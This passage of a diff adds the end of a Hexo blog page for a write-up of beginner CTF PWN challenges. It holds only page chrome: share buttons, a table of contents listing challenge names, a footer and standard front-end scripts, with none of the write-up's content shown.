+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://Du4t.github.io/2019/10/08/gong-fang-shi-jie-pwn-xin-shou-lian-xi-qu-wp/&title=《攻防世界PWN新手练习区WP》 — Du4t的博客&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2019/10/08/ge-shi-hua-zi-fu-chuan-lou-dong/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">格式化字符串漏洞</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#CGfsb"><span class="post-toc-number">1.</span> <span class="post-toc-text">CGfsb</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#when-did-you-born"><span class="post-toc-number">2.</span> <span class="post-toc-text">when_did_you_born</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#hello-pwn"><span class="post-toc-number">3.</span> <span class="post-toc-text">hello_pwn</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level0"><span class="post-toc-number">4.</span> <span class="post-toc-text">level0</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level-2"><span class="post-toc-number">5.</span> <span class="post-toc-text">level 2</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </div></div></aside>
+    
+</article>
+
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Du4t © 2019
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://Du4t.github.io/2019/10/08/gong-fang-shi-jie-pwn-xin-shou-lian-xi-qu-wp/&title=《攻防世界PWN新手练习区WP》 — Du4t的博客&pic=http://Du4t.github.io/img/100.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://Du4t.github.io/2019/10/08/gong-fang-shi-jie-pwn-xin-shou-lian-xi-qu-wp/&title=《攻防世界PWN新手练习区WP》 — Du4t的博客&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACpUlEQVR42u3aO44jMQwFwLn/pXeBjTZxz3ukZM8A1ZGD/pUMiGySX1/x8eff8f/vV8fzOcmd2zscOPDw8PBGr568bo5vlyY/P39nPDw8vNu8G8Fgs/W/OjN/Zzw8PLyfwJulwskCPQcJPDw8vN/Le378frFmC4qHh4f3KV6eLm8S8aTKuiny4uHh4b2HN2uAffb39f4eHh4e3qirvtmyZwFjNo7w8io8PDy8C7zksz8vquZDAO2dNy0xPDw8vNu8sx/8z2fOSh51MRcPDw/vKK+9eNYqy5PmTfh5+cWAh4eHd5nXbu45Ka+yJul+ck88PDy827xNGJi1yk4l0HXXDg8PD+/Q6EC01cYlhtlWnpw5DGB4eHh4h3ht275t/Ccp+OyIGm94eHh4b+HNigWzYal9aPnmz8DDw8O7wGs/8ttkty0lnBpiwMPDw7vN24wFtAMEeWlj1kJb/TN4eHh4Aa9NXtsEtx3GwsPDw/v5vCTBbTf3s42ufLygHjLAw8PDW/M2n/rDrTle1tk8AB4eHt49XpsEtw3+FtAm998EJzw8PLy389pBgfYl2mvrxhgeHh7eUd6wDR+XLWaNtH2RFw8PD+/9vOfbtc2ndmggL1jg4eHhfYqXNK42Ce6quryvB+Ph4eFd5rVbfD5e0C5cO74QBQY8PDy8NW9T/c2Hn/Ky76Y0HFWp8fDw8Na8zbY+G4fKn5g/PRoawMPDw7vAm73QBtlGsDqJx8PDw7vAO9twypPsvJGWFCzaQQc8PDy8Pe/G9r0Z0soLFlFgwMPDw7vGa5PjTTF3xh5ehYeHh/dRXhtO2v357IgYHh4e3k/jzV69HRGYDWwdCAx4eHh4AW/WfMrLBJuNPl8CPDw8vPfw2nR2VnrIC8HPTxl28PDw8PDO8P4CXIVK39T0BCEAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '死鬼去哪里了！';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(つェ⊂)咦!又好了!';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
